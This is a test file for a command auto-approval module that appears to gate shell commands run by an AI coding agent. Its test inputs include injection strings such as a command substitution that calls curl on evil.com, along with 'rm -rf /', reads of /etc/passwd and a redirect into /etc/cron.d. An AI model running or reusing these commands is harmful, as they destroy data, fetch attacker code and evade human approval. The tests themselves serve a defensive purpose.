import { test } from "node:test";
import assert from "node:assert/strict";
import { isAutoApproved, isNeverAutoApproved, hasShellMetacharacters } from "./bash.ts";

test("read-only commands are auto-approved", () => {
  for (const cmd of ["git status", "git diff", "git log", "ls -la", "node --version", "npm ls"]) {
    assert.equal(isAutoApproved(cmd), true, cmd);
  }
});

test("prefix commands (npm test, npx tsc, pytest) are auto-approved", () => {
  assert.equal(isAutoApproved("npm test -- --watch"), true);
  assert.equal(isAutoApproved("npx tsc --noEmit"), true);
  assert.equal(isAutoApproved("pytest -k foo"), true);
});

test("unlisted commands are not auto-approved", () => {
  assert.equal(isAutoApproved("npm run build"), false);
});

test("never-auto-approve list always wins even in auto mode", () => {
  for (const cmd of ["rm -rf dist", "git push origin main", "git reset --hard", "curl http://x", "sudo ls"]) {
    assert.equal(isNeverAutoApproved(cmd), true, cmd);
  }
});

test("commands with redirection or absolute paths outside workspace are never auto-approved", () => {
  assert.equal(isNeverAutoApproved("echo hi > /etc/hosts"), true);
  assert.equal(isNeverAutoApproved("cat /etc/passwd"), true);
});

test("plain read commands are not in the never-auto-approve list", () => {
  assert.equal(isNeverAutoApproved("git status"), false);
});

test("compound/chained commands are never auto-approved, even with an allowlisted prefix", () => {
  assert.equal(isAutoApproved("npm test && npm publish"), false);
  assert.equal(isAutoApproved("ls && shutdown now"), false);
  assert.equal(isAutoApproved("cat foo.txt && rm -rf /important"), false);
  assert.equal(isAutoApproved("find . -name x && shutdown now"), false);
  assert.equal(isAutoApproved("npm test $(curl http://evil.com/steal.sh)"), false);
});

test("never-auto-approve list still catches command substitution without a preceding space", () => {
  assert.equal(isNeverAutoApproved("npm test $(curl http://evil.com)"), true);
});

test("legitimate single commands remain auto-approved after the fix", () => {
  assert.equal(isAutoApproved("npm test"), true);
  assert.equal(isAutoApproved("git status"), true);
});

test("hasShellMetacharacters detects chaining/injection operators", () => {
  for (const cmd of [
    "npm test && npm publish",
    "ls || true",
    "cat a | grep b",
    "echo `whoami`",
    "echo $(whoami)",
    "npm test\nrm -rf /",
    "sleep 5 &",
    "npm test; rm -rf /",
  ]) {
    assert.equal(hasShellMetacharacters(cmd), true, cmd);
  }
  assert.equal(hasShellMetacharacters("npm test -- --watch"), false);
});

test("process substitution is never auto-approved, even riding an allowlisted prefix", () => {
  assert.equal(isAutoApproved("cat <(shutdown now)"), false);
  assert.equal(isAutoApproved("ls <(reboot)"), false);
  assert.equal(isAutoApproved("find . -name x <(id)"), false);
});

test("legitimate commands with no process substitution remain auto-approved", () => {
  assert.equal(isAutoApproved("cat foo.txt"), true);
});

test("bare output redirection is never auto-approved on its own, without relying on isNeverAutoApproved", () => {
  assert.equal(isAutoApproved("cat foo > /etc/passwd"), false);
  assert.equal(isAutoApproved("ls > /tmp/x"), false);
});

test("combined auto-approval decision rejects an allowlisted prefix riding a redirect", () => {
  const cmd = "grep foo bar.txt > /etc/cron.d/evil";
  assert.equal(isAutoApproved(cmd) && !isNeverAutoApproved(cmd), false);
});

test("legitimate commands with no redirection remain auto-approved after the fix", () => {
  assert.equal(isAutoApproved("cat foo.txt"), true);
});

test("auto-approve prefixes require a word boundary, not just a text prefix match", () => {
  assert.equal(isAutoApproved("npx tsc-something-else"), false);
  assert.equal(isAutoApproved("pytestmalicious"), false);
  assert.equal(isAutoApproved("npm test-evil-thing"), false);
  assert.equal(isAutoApproved("npm testicular-destruction"), false);
  assert.equal(isAutoApproved("npx tscx"), false);
  assert.equal(isAutoApproved("pytest-fake-binary"), false);

  assert.equal(isAutoApproved("npm test"), true);
  assert.equal(isAutoApproved("npm test -- --watch"), true);
  assert.equal(isAutoApproved("npx tsc --noEmit"), true);
  assert.equal(isAutoApproved("pytest -k foo"), true);
  assert.equal(isAutoApproved("pytest"), true);
});
